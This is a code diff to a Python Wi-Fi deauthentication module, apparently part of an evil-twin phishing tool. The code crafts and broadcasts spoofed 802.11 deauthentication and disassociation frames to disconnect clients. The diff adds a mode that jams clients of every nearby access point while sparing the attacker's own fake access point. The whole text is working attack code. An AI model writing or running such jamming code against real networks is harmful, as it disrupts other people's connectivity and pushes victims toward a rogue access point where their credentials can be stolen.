@@ -17,13 +17,14 @@ class Deauthentication(object):
     Handles all the deauthentication process.
     """
 
-    def __init__(self, ap_bssid, jamming_interface):
+    def __init__(self, ap_bssid, jamming_interface, ap_iface_mac):
         """
         Setup the class with all the given arguments.
 
         :param self: A Deauthentication object.
         :param ap_bssid: The MAC address of the selected access point.
         :param jamming_interface: The interface to be used for jamming.
+        :param ap_iface_mac: The mac address of interface for the  fake access point
         :param send_deauth_thread: The thread used to send the deauth \
                 and disassoc frames
         :param find_client_thread: The thread used to find the target\
@@ -31,6 +32,7 @@ class Deauthentication(object):
         :type self: Deauthentication
         :type ap_bssid: string
         :type jamming_interface: string
+        :type ap_iface_mac: string
         :type send_deauth_thread: Thread
         :type find_client_thread: Thread
         :return: None
@@ -42,19 +44,32 @@ class Deauthentication(object):
         self._ap_bssid = ap_bssid
         self._should_continue = True
         self._jamming_interface = jamming_interface
+        self._ap_iface_mac = ap_iface_mac
         self._non_client_addresses = constants.NON_CLIENT_ADDRESSES
-        self._send_deauth_packets_thread = threading.Thread(\
-                target = self._send_deauthentication_packets)
-        self._find_client_thread = threading.Thread(\
-                target=self._find_clients)
+        self._deauth_thread = None
+        self._find_client_thread = None
 
         # create a socket for sending packets
         self._socket = linux.L2Socket(iface=self._jamming_interface)
 
         # craft and add deauthentication packet to broadcast address
-        self._craft_and_add_packet(self._ap_bssid, constants.WIFI_BROADCAST)
+        # add broadcast deauth when --essid not being used
+        if not self._is_frenzy_deauth():
+            self._craft_and_add_packet(self._ap_bssid, constants.WIFI_BROADCAST,\
+                    self._ap_bssid)
+ 
+    def _is_frenzy_deauth(self):
+        """
+        Deauth all clients when --essid option is used
+        :param self: A Deauthentication object
+        :type self: Deauthentication
+        :return is_frenzy
+        :rtype : bool
+        """
+        is_frenzy = True if self._ap_bssid is None else False
+        return is_frenzy
 
-    def _craft_and_add_packet(self, sender, receiver):
+    def _craft_and_add_packet(self, sender, receiver, bssid):
         """
         Craft a deauthentication and a disassociation packet and add
         them to the list of deauthentication packets
@@ -62,19 +77,21 @@ class Deauthentication(object):
         :param self: A Deauthentication object
         :param sender: The MAC address of the sender
         :param receiver: The MAC address of the receiver
+        :param bssid: The MAC address of the AccessPoint
         :type self: Deauthentication
         :type sender: string
         :type receiver: string
+        :type bssid: string
         :return: None
         :rtype: None
         """
 
         deauth_packet = (dot11.RadioTap() / dot11.Dot11(type=0, subtype=12, \
-                    addr1=receiver, addr2=sender, addr3=self._ap_bssid) \
+                    addr1=receiver, addr2=sender, addr3=bssid) \
                   / dot11.Dot11Deauth())
 
         disassoc_packet = (dot11.RadioTap() / dot11.Dot11(type=0, subtype=10, \
-                    addr1=receiver, addr2=sender, addr3=self._ap_bssid) \
+                    addr1=receiver, addr2=sender, addr3=bssid) \
                   / dot11.Dot11Disas())
         
         self._deauthentication_packets.append(disassoc_packet)
@@ -101,6 +118,13 @@ class Deauthentication(object):
             # get the sender and receiver
             receiver = packet.addr1
             sender = packet.addr2
+            if self._is_frenzy_deauth():
+                bssid = packet.addr3
+                #Do not send deauth for our fake ap
+                if bssid == self._ap_iface_mac:
+                    return
+            else:
+                bssid = self._ap_bssid
 
             # create a list of addresses that are not acceptable
             non_valid_list = self._non_client_addresses + self._observed_clients
@@ -109,22 +133,22 @@ class Deauthentication(object):
             # discovered client check to see if either one is a client
             if receiver not in non_valid_list and sender not in non_valid_list:
                 # in case the receiver is the access point
-                if receiver == self._ap_bssid:
+                if receiver == bssid:
                     # add the sender to the client list
                     self._observed_clients.append(sender)
 
                     # create and add deauthentication packets for client
-                    self._craft_and_add_packet(sender, self._ap_bssid)
-                    self._craft_and_add_packet(self._ap_bssid, sender)
+                    self._craft_and_add_packet(sender, bssid, bssid)
+                    self._craft_and_add_packet(bssid, sender, bssid)
 
                 # in case the sender is the access point
-                elif sender == self._ap_bssid:
+                elif sender == bssid:
                     # add the receiver to the client list
                     self._observed_clients.append(receiver)
 
                     # create and add deauthentication packets for client
-                    self._craft_and_add_packet(receiver, self._ap_bssid)
-                    self._craft_and_add_packet(self._ap_bssid, receiver)
+                    self._craft_and_add_packet(receiver, bssid, bssid)
+                    self._craft_and_add_packet(bssid, receiver, bssid)
 
     def _find_clients(self):
         """
@@ -214,11 +238,14 @@ class Deauthentication(object):
         .. note: count has the default value of 20.
         """
 
+        self._deauth_thread = threading.Thread(target=self._send_deauthentication_packets)
+        self._find_client_thread = threading.Thread(target=self._find_clients)
+
         # start finding clients in a separate thread
         self._find_client_thread.start()
 
         # start deauthenticating in a separate thread
-        self._send_deauth_packets_thread.start()
+        self._deauth_thread.start()
 
     def on_exit(self):
         """
@@ -230,5 +257,5 @@ class Deauthentication(object):
         """
         if self._should_continue:
             self.stop_deauthentication()
-            self._send_deauth_packets_thread.join()
-            self._find_client_thread.join()
+            self._deauth_thread.join(10)
+            self._find_client_thread.join(10)
